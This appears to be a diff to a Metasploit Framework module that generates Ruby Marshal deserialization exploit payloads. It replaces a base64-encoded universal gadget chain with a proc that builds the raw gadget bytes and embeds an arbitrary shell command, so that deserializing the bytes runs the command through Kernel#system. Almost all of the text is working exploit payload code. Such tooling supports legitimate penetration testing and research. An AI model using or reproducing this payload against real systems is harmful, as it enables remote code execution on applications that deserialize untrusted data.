@@ -6,33 +6,23 @@ module Msf
     # Ruby deserialization class
     class RubyDeserialization
       # That could be in the future a list of payloads used to exploit the Ruby deserialization vulnerability.
-      # TODO: Add more payloads
-      # TDOO: Create a json file with the payloads?
       PAYLOADS = {
-        'Universal' => {
-          'status' => 'dynamic',
-          'length_offset' => 309,
-          'buffer_offset' => 310,
-          # https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
-          'bytes' => 'BAhbCGMVR2VtOjpTcGVjRmV0Y2hlcmMTR2VtOjpJbnN0YWxsZXJVOhVHZW06OlJlcXVpcmVtZW50WwZvOhxHZW06OlBhY2thZ2U6OlRhclJlYWRlcgY6CEBpb286FE5ldDo6QnVmZmVyZWRJTwc7B286I0dlbTo6UGFja2FnZTo6VGFyUmVhZGVyOjpFbnRyeQc6CkByZWFkaQA6DEBoZWFkZXJJIhlTR1Y1WkdWeVFXNWtjbUZrWlNBZwY6BkVUOhJAZGVidWdfb3V0cHV0bzoWTmV0OjpXcml0ZUFkYXB0ZXIHOgxAc29ja2V0bzoUR2VtOjpSZXF1ZXN0U2V0BzoKQHNldHNvOw4HOw9tC0tlcm5lbDoPQG1ldGhvZF9pZDoLc3lzdGVtOg1AZ2l0X3NldEkiBQY7DFQ7EjoMcmVzb2x2ZQ=='
-        }
-      }.freeze
+        # https://devcraft.io/2021/01/07/universal-deserialisation-gadget-for-ruby-2-x-3-x.html
+        net_writeadapter: proc do |command|
+          "\x04\b[\bc\x15Gem::SpecFetcherc\x13Gem::InstallerU:\x15Gem::Requirement" \
+          "[\x06o:\x1CGem::Package::TarReader\x06:\b@ioo:\x14Net::BufferedIO\a;\ao:" \
+          "#Gem::Package::TarReader::Entry\a:\n@readi\x00:\f@headerI#{Marshal.dump(Rex::Text.rand_text_alphanumeric(12..20))[2..-1]}" \
+          "\x06:\x06ET:\x12@debug_outputo:\x16Net::WriteAdapter\a:\f@socketo:\x14" \
+          "Gem::RequestSet\a:\n@setso;\x0E\a;\x0Fm\vKernel:\x0F@method_id:\vsystem:\r" \
+          "@git_setI#{Marshal.dump(command)[2..-1]}\x06;\fT;\x12:\fresolve"
+        end
+      }
 
       def self.payload(payload_name, command = nil)
-        payload = PAYLOADS[payload_name]
 
-        raise ArgumentError, "#{payload_name} payload not found in payloads" if payload.nil?
+        raise ArgumentError, "#{payload_name} payload not found in payloads" unless payload_names.include? payload_name.to_sym
 
-        bytes = Rex::Text.decode_base64(payload['bytes'])
-
-        length = [command.length.ord + 5 ].pack('C*')
-
-        bytes[payload['buffer_offset'] - 1] += command
-        bytes[payload['length_offset']] = length
-
-        bytes.gsub!('SGV5ZGVyQW5kcmFkZSAg', Rex::Text.rand_text_alphanumeric(20))
-
-        bytes
+        PAYLOADS[payload_name.to_sym].call(command)
       end
 
       def self.payload_names
